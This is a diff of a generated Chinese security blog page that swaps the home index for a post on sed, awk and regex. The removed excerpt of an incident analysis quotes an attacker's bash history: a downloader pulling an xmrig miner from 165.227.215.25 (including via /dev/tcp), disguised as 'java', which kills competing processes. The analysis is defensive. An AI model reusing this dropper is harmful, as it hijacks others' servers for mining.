@@ -6,17 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>rouxianer&#39;s share</title>
+  <title>sed、awk与正则表达式（未整理） | rouxianer&#39;s share</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="信息安全">
-<meta property="og:type" content="website">
-<meta property="og:title" content="rouxianer&#39;s share">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="##bash通配符?:单字符通配*:多字符通配符[]:括号条件内匹配 通配符是完全匹配；正则是包含匹配 anaconda-ks.cfg是安装信息 grep awk sed等命令可以使用正则表达式(linux三大利器)ls find cp 不能使用正则，只能使用通配符 ##正则表达式    查找 测试     取出 测试   匹配 测试         特定字符 字符  范围内字符      任意字">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sed、awk与正则表达式（未整理）">
+<meta property="og:url" content="http://yoursite.com/2018/01/04/regular-expression/index.html">
 <meta property="og:site_name" content="rouxianer&#39;s share">
-<meta property="og:description" content="信息安全">
+<meta property="og:description" content="##bash通配符?:单字符通配*:多字符通配符[]:括号条件内匹配 通配符是完全匹配；正则是包含匹配 anaconda-ks.cfg是安装信息 grep awk sed等命令可以使用正则表达式(linux三大利器)ls find cp 不能使用正则，只能使用通配符 ##正则表达式    查找 测试     取出 测试   匹配 测试         特定字符 字符  范围内字符      任意字">
+<meta property="og:updated_time" content="2018-01-04T06:11:35.912Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="rouxianer&#39;s share">
-<meta name="twitter:description" content="信息安全">
+<meta name="twitter:title" content="sed、awk与正则表达式（未整理）">
+<meta name="twitter:description" content="##bash通配符?:单字符通配*:多字符通配符[]:括号条件内匹配 通配符是完全匹配；正则是包含匹配 anaconda-ks.cfg是安装信息 grep awk sed等命令可以使用正则表达式(linux三大利器)ls find cp 不能使用正则，只能使用通配符 ##正则表达式    查找 测试     取出 测试   匹配 测试         特定字符 字符  范围内字符      任意字">
   
     <link rel="alternative" href="/atom.xml" title="rouxianer&#39;s share" type="application/atom+xml">
   
@@ -148,16 +149,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-regular-expression" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-regular-expression" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/04/regular-expression/">sed、awk与正则表达式（未整理）</a>
+    <h1 class="article-title" itemprop="name">
+      sed、awk与正则表达式（未整理）
     </h1>
   
 
@@ -223,16 +222,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/01/04/regular-expression/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/01/04/regular-expression/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2018/01/03/webs/exp_of_em_respon/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">一次攻击分析</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -252,225 +310,14 @@
 
 
 
-
   
-    <article id="post-webs/exp_of_em_respon" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/03/webs/exp_of_em_respon/">一次攻击分析</a>
-    </h1>
   
 
-        
-        <a href="/2018/01/03/webs/exp_of_em_respon/" class="archive-article-date">
-  	<time datetime="2018-01-03T03:31:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>##起因<br>昨天下班儿回家的路上，同事突然通过微信发了一个<strong>新建 Microsoft office word 2007 文档.docx</strong>过来。怀着下班懈怠的想法我并没有打开这个文档:）<br><del>而且他连名字都不改！懒惰！</del><br>稍后上了地铁，得知是一个业务系统被攻击了，业务在不断重启（当时说的是服务器，后来说是软件服务），他发给我的是一个现场的日志。后来听大佬说是可能是误kill了关键服务，所以导致服务重启；</p>
-<p>下面先看一下history里的东西</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">916  sPid=$$  //获得当前程序（shell）的pid</span><br><span class="line">917  mPid=&apos;&apos;  //估计是脚本pid后面会赋值</span><br><span class="line">918  mName=&apos;java&apos;  //伪装名称为java</span><br><span class="line">919  checkCmd() &#123;</span><br><span class="line">         command -v $1 &gt;/dev/null 2&gt;&amp;1;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
-<p>关于这条语句，可以查看这篇<a href="http://blog.csdn.net/ggxiaobai/article/details/53507530" target="_blank" rel="noopener">文章</a><br>看完是不是大概懂了这个bash指令的意思，<br>好的这条指令的意思是查看$1指令是否存在[拖走],$1是传参的第1个参数值（指令本身是第0个）</p>
-<pre><code>920  downloader () {
-     if checkCmd wget; then//查看wget是否存在
-         wget $1 -O $2 ;
-     elif checkCmd curl; then//查看curl是否存在
-         curl $1 -o $2;
-     elif checkCmd python; then//查看是否装了python
-         if [ &quot;`python -c &quot;import sys; print(sys.version_info[0])&quot;`&quot; = &quot;3&quot; ]; then
-         //判断是不是python3
-             python -c &quot;from urllib.request import urlopen;
-             u = urlopen(&apos;&quot;$1&quot;&apos;); localFile = open(&apos;&quot;$2&quot;&apos;, &apos;wb&apos;);
-             localFile.write(u.read()); localFile.close()&quot;;
-         else 
-         //python2的情况
-             python -c &quot;from urllib import urlopen;
-            u = urlopen(&apos;&quot;$1&quot;&apos;);
-            localFile = open(&apos;&quot;$2&quot;&apos;, &apos;wb&apos;); 
-            localFile.write(u.read()); 
-            localFile.close()&quot;;
-         fi; 
-     else
-         cat &lt; /dev/tcp/165.227.215.25/5555 &gt; $2;
-         //把/dev/tcp/165.227.215.25/5555的内容定向输入到$2
-     fi;
-     chmod +x $2;
-     }
-921  killer() {
-         for tmpVar in `ps -aeo pid,%cpu,command | sed 1d | sort -k 2 | tail -n 10 | awk &apos;{print $1}&apos;`;
-         //查看进程里pid,%cpu,command三列，删除第一列，按照第二列排序，取最后10个结果，取第一列的值
-         //查看进程中cpu占用率最高的10个进程
-         do
-             if [ $tmpVar = $sPid ]; then
-                 continue;
-             //如果pid是shell的pid
-             fi;
-             if [ $tmpVar = $mPid ]; then
-             //如果pid是该脚本的pid
-                 continue；
-             fi;
-             if [ `ps -o %cpu $tmpVar | sed 1d | sed &apos;s/\..*//g&apos;` -ge 60 ]; then
-             //
-                 if [ `ps $tmpVar | sed 1d | awk &apos;{print $5}&apos; | grep java` ]; then
-                     continue;
-                 fi;    
-                 if [ `ps $tmpVar | sed 1d | awk &apos;{print $5}&apos; | grep sh` ]; then
-                     continue;             
-                 fi;             
-                 if [ `ps $tmpVar | sed 1d | awk &apos;{print $5}&apos; | grep bash` ]; then                 
-                     continue;             
-                 fi;             
-                 kill -9 $tmpVar;
-                 rm -f `ls -l /proc/$tmpVar/exe 2&gt;&amp;1 | sed &apos;s/.*-&gt; //g&apos;`;
-                 fi;     
-             done; 
-      }
-922  runer() {
-         if [ -z &quot;$mPid&quot; ]; then
-             if [ ! -f $mName ]; then 
-                 downloader http://165.227.215.25/xmrig-y $mName;
-             fi;         
-             chmod +x ./$mName;
-             ./$mName;
-         fi;
-         mPid=`ps -eo pid,command | grep $mName | head -n 1 | awk &apos;{print $1}&apos;`;
-     }
-923  pkill python; pkill $mName
-924  downloader http://165.227.215.25/xmrig-y $mName
-925  ps -ef|grep java
-</code></pre>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/01/03/webs/exp_of_em_respon/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-markdown" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/12/30/markdown/">markdown</a>
-    </h1>
   
 
-        
-        <a href="/2017/12/30/markdown/" class="archive-article-date">
-  	<time datetime="2017-12-30T01:04:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-12-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="markdown笔记"><a href="#markdown笔记" class="headerlink" title="markdown笔记"></a>markdown笔记</h1><p>Just for test</p>
-<p>##常用语法</p>
-<p>###标题<br>在文本前输入#用于声明标题，随数量增加级别递减；</p>
-<p>###粗体<br>在内容两侧分别加<strong>2个星号</strong>，**文本内容**；<strong>示例</strong></p>
-<p>###斜体<br>在内容两侧分别加<strong>1个星号</strong>，*文本内容*；<em>示例</em></p>
-<p>###删除线<br>在内容两侧分别加<strong>2个波浪线</strong>，~~文本内容~~;<del>示例</del></p>
-<p>###分割线<br>使用<strong>3个星号</strong>或者<strong>3个小短线</strong>，使用3个小短线会强制把上一行内容设置为2级标题;</p>
-<h2 id="3个星号"><a href="#3个星号" class="headerlink" title="3个星号"></a><code>3个星号</code></h2><p><code>3个星号</code></p>
-<hr>
-<p>###外链<br>使用<code>**\[描述](链接地址)**</code>格式添加外链；<br>示例：<a href="about:blank" target="_blank" rel="noopener">空白页</a></p>
-<p>###单行代码<br>在内容两侧分别加<strong>2个`(一称小句号)</strong>，`文本内容`;<code>示例</code></p>
-<p>###多行代码<br>在内容两侧分别加<strong>3个`</strong>，```文本内容```;<br>(需要在文本后多换一行)  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我有行号  </span><br><span class="line">我有行号  </span><br><span class="line">我有行号</span><br></pre></td></tr></table></figure>
-<p>或者换新行，然后在段落头输入<strong><code>Tab</code></strong>，或<strong><code>4个空格</code></strong>  </p>
-<pre><code>我没有行号
-我没有行号
-我没有行号
-</code></pre><p>###引入内容<br>在内容前添加<strong>></strong>表示引入内容；</p>
-<blockquote>
-<p>示例  </p>
-</blockquote>
-<p>###插入图片<br>使用<code>**\![描述](链接地址)**</code>插入图片；<br><img src="/assets/img/end.jpeg" alt="没有"><br><img src="/assets/img/end.jpeg" onmouseover="alert('nothing else');alert('thanks')"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/12/30/markdown/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
+
   
 
 
@@ -493,8 +340,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
